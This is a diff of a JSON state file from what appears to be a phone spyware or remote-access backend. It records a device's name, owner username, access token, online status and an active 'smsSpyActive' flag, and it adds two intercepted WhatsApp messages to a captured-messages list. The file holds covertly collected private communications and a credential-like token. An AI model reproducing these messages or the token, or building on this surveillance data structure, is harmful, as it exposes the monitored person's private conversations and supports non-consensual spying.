@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775153700491,
+    "lastSeen": 1775153703974,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "Gak blh gadang",
+        "time": "03/04 01:15",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775153704424
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "Gak blh gadang",
+        "time": "03/04 01:15",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775153704360
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
